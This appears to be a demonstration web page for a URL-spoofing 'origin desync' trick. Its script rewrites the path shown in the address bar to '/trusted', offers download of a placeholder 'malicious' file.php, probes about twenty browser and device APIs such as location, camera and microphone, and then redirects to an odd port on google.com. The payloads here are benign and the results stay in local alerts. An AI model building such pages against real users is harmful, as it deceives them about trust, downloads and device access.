<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Origin Desync Login PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
}

button {
  margin:6px;
  font-size:14px;
  padding:8px 12px;
}

#panel {
  display:none;
  max-width:520px;
  margin:60px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}

h2 { text-align:center; margin-bottom:6px; }
.sub { text-align:center; color:#666; margin-bottom:20px; }

.notice {
  margin-top:14px;
  font-size:13px;
  color:#b00020;
}

.download-button {
  margin-top:20px;
  width:100%;
  padding:12px;
  font-size:16px;
  border-radius:10px;
  border:none;
  background:#007aff;
  color:#fff;
}

video { width:100%; margin-top:10px; }

pre {
  margin-top:12px;
  background:#111;
  color:#0f0;
  padding:10px;
  font-size:11px;
  max-height:260px;
  overflow:auto;
}
</style>
</head>

<body>

<div style="text-align:center">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Download File</h2>
  <div class="sub">Click below to download file.php</div>

  <button class="download-button" onclick="downloadFile()"> Download File (file.php) </button>
  <hr>
  <button onclick="getLocation()">Get Location</button>
  <button onclick="openCamera()">Open Camera</button>
  <button onclick="getBattery()">Get Battery</button>
  <button onclick="getNetworkStatus()">Get Network Status</button>
  <button onclick="vibrate()">Vibrate</button>
  <button onclick="getOrientation()">Get Orientation</button>
  <button onclick="getMotion()">Get Motion</button>
  <button onclick="speakText()">Speak Text</button>
  <button onclick="checkFullscreen()">Check Fullscreen</button>
  <button onclick="checkVisibility()">Check Visibility</button>
  <button onclick="getCanvas()">Check Canvas/WebGL</button>
  <button onclick="getGamepadStatus()">Get Gamepad Status</button>
  <button onclick="checkWebRTC()">Check WebRTC</button>
  <button onclick="getScreenInfo()">Get Screen Info</button>
  <button onclick="getLangTZ()">Get Language and Timezone</button>
  <button onclick="getOnlineStatus()">Get Online Status</button>
  <button onclick="checkPermissions()">Check Permissions</button>
  <button onclick="getDeviceInfo()">Get Device Info</button>
  <button onclick="openWebSocket()">Open WebSocket</button>
  <button onclick="requestPushNotification()">Request Push Notification</button>
  <button onclick="getDeviceMemory()">Get Device Memory</button>

  <hr>
  <div class="notice">Demo only — browser permission required</div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');

// File download function
function downloadFile() {
  const fileContent = `<?php echo 'This is a malicious PHP file!'; ?>`;
  const fileBlob = new Blob([fileContent], { type: 'text/plain' });
  const fileUrl = URL.createObjectURL(fileBlob);

  const downloadLink = document.createElement('a');
  downloadLink.href = fileUrl;
  downloadLink.download = 'file.php';
  document.body.appendChild(downloadLink);
  downloadLink.click();
  document.body.removeChild(downloadLink);
}

// Get Location
function getLocation() {
  if (!navigator.geolocation) return alert('Geolocation API not supported');
  navigator.geolocation.getCurrentPosition(
    pos => alert(`Location: ${pos.coords.latitude}, ${pos.coords.longitude}`),
    () => alert('Permission denied for geolocation')
  );
}

// Open Camera
function openCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(s => alert('Camera opened'))
    .catch(() => alert('Camera denied'));
}

// Get Battery Status
function getBattery() {
  if (!navigator.getBattery) return alert('Battery API not supported');
  navigator.getBattery().then(b => alert(`Battery Level: ${Math.round(b.level * 100)}%`));
}

// Get Network Status
function getNetworkStatus() {
  if (!navigator.connection) return alert('Network API not supported');
  alert(`Network Type: ${navigator.connection.effectiveType}`);
}

// Vibrate Device
function vibrate() {
  if (!navigator.vibrate) return alert('Vibration API not supported');
  navigator.vibrate(100);
  alert('Vibrated for 100ms');
}

// Get Device Orientation
function getOrientation() {
  if (!window.DeviceOrientationEvent) return alert('Device Orientation API not supported');
  window.addEventListener('deviceorientation', (e) => {
    alert(`Orientation: alpha=${e.alpha}, beta=${e.beta}, gamma=${e.gamma}`);
  });
}

// Get Device Motion
function getMotion() {
  if (!window.DeviceMotionEvent) return alert('Device Motion API not supported');
  window.addEventListener('devicemotion', (e) => {
    alert('Motion detected');
  });
}

// Speak Text
function speakText() {
  const utterance = new SpeechSynthesisUtterance('API fingerprint');
  speechSynthesis.speak(utterance);
  alert('Speaking text: API fingerprint');
}

// Check Fullscreen
function checkFullscreen() {
  if (!document.documentElement.requestFullscreen) return alert('Fullscreen API not supported');
  document.documentElement.requestFullscreen();
  alert('Entered fullscreen mode');
}

// Check Visibility State
function checkVisibility() {
  alert(`Visibility State: ${document.visibilityState}`);
}

// Check Canvas/WebGL
function getCanvas() {
  const c = document.createElement('canvas');
  c.getContext('2d').fillRect(0, 0, 10, 10);
  alert('Canvas/WebGL checked');
}

// Get Gamepad Status
function getGamepadStatus() {
  const gamepads = navigator.getGamepads();
  alert(`Gamepads connected: ${gamepads.length}`);
}

// Check WebRTC Audio
function checkWebRTC() {
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(() => alert('WebRTC audio access granted'))
    .catch(() => alert('WebRTC audio access denied'));
}

// Get Screen Info
function getScreenInfo() {
  alert(`Screen Width: ${screen.width}, Screen Height: ${screen.height}`);
}

// Get Language and Timezone
function getLangTZ() {
  alert(`Language: ${navigator.language}, Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
}

// Get Online Status
function getOnlineStatus() {
  alert(`Online Status: ${navigator.onLine ? 'Online' : 'Offline'}`);
}

// Check Permissions
function checkPermissions() {
  if (!navigator.permissions) return alert('Permissions API not supported');
  const permissions = ['camera', 'microphone', 'geolocation', 'notifications'];
  permissions.forEach(async (perm) => {
    try {
      const r = await navigator.permissions.query({ name: perm });
      alert(`${perm} Permission: ${r.state}`);
    } catch (e) {
      alert(`${perm} Permission: Error`);
    }
  });
}

// Get Device Info
function getDeviceInfo() {
  alert(`Device Info: ${navigator.userAgent}`);
}

// Open WebSocket
function openWebSocket() {
  try {
    const ws = new WebSocket('ws://localhost:8080');
    ws.onopen = () => alert('WebSocket opened');
    ws.onerror = () => alert('WebSocket error');
  } catch {
    alert('WebSocket error');
  }
}

// Request Push Notification
function requestPushNotification() {
  Notification.requestPermission().then(permission => alert(`Push Notification: ${permission}`));
}

// Get Device Memory
function getDeviceMemory() {
  if (navigator.deviceMemory) {
    alert(`Device Memory: ${navigator.deviceMemory} GB`);
  } else {
    alert('Device Memory API not supported');
  }
}

trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
  
  // Automatically navigate to Google after a slight delay
  setTimeout(() => {
    location.href = 'https://google.com:9090';
  }, 2000); // Adjust the delay as necessary
};
</script>

</body>
</html>
